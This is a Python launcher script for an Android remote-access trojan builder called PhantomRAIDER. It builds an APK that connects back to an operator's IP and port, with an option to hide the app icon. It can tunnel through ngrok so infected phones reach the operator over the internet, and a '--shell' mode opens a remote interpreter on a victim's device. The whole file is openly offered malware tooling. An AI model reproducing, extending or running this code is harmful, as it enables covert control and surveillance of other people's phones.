#!/usr/bin/python
# -*- coding: utf-8 -*-

from utils import *
import argparse
import sys
import platform
try:
    from pyngrok import ngrok, conf
    HAS_NGROK = True
except ImportError:
    HAS_NGROK = False


#   _____   _                       _                         _____            _____   _____   ______    _____ 
#  |  __ \ | |                     | |                       |  __ \     /\    |_   _| |  __ \ |  ____|  |  __ \
#  | |__) || |__     __ _  _ __    | |_    ___  _ __ ___     | |__) |   /  \     | |   | |  | || |__     | |__) |
#  |  ___/ | '_ \   / _` | | '_ \  | __|  / _ \ | '_ ` _ \   |  _  /   / /\ \    | |   | |  | ||  __|    |  _  / 
#  | |     | | | | | (_| | | | | | | |_  | (_) || | | | | |  | | \ \  / ____ \  _| |_  | |__| || |____   | | \ \ 
#  |_|     |_| |_|  \__,_| |_| |_|  \__|  \___/ |_| |_| |_|  |_|  \_\/_/    \_\|_____| |_____/ |______|  |_|  \_\
#                                                                                             - By zannyphantom-13
#                                                                                             - Android 14-17 Compatible Version

parser = argparse.ArgumentParser(usage="%(prog)s [--build] [--shell] [-i <IP> -p <PORT> -o <apk name>]")
parser.add_argument('--build',help='For Building the apk',action='store_true')
parser.add_argument('--shell',help='For getting the Interpreter',action='store_true')
parser.add_argument('--ngrok',help='For using ngrok',action='store_true')
parser.add_argument('-i','--ip',metavar="<IP>" ,type=str,help='Enter the IP')
parser.add_argument('-p','--port',metavar="<Port>", type=str,help='Enter the Port')
parser.add_argument('-o','--output',metavar="<Apk Name>", type=str,help='Enter the apk Name')
parser.add_argument('-icon','--icon',help='Visible Icon',action='store_true')
args = parser.parse_args()


# Allow Python 3.6 through 3.13 (use sys.version_info to avoid string slice bug on 3.10+)
py = sys.version_info
if (py.major, py.minor) < (3, 6) or (py.major, py.minor) > (3, 13):
    print(stdOutput("error")+"\033[1mPython version should be between 3.6 to 3.13")
    sys.exit()

if args.build:
    port_ = args.port
    icon=True if args.icon else None
    if args.ngrok:
        if not HAS_NGROK:
            print(stdOutput("error")+"\033[1mpyngrok not found - run: pip3 install pyngrok")
            sys.exit(1)
        conf.get_default().monitor_thread = False
        port = 8000 if not port_ else port_
        tcp_tunnel = ngrok.connect(port, "tcp")
        ngrok_process = ngrok.get_ngrok_process()
        domain,port = tcp_tunnel.public_url[6:].split(":")
        ip = socket.gethostbyname(domain)
        print(stdOutput("info")+"\033[1mTunnel_IP: %s PORT: %s"%(ip,port))
        build(ip,port,args.output,True,port_,icon)
    else:
        if args.ip and args.port:
            build(args.ip,port_,args.output,False,None,icon)
        else:
            print(stdOutput("error")+"\033[1mArguments Missing")

if args.shell:
    if args.ip and args.port:
        get_shell(args.ip,args.port) 
    else:
        print(stdOutput("error")+"\033[1mArguments Missing")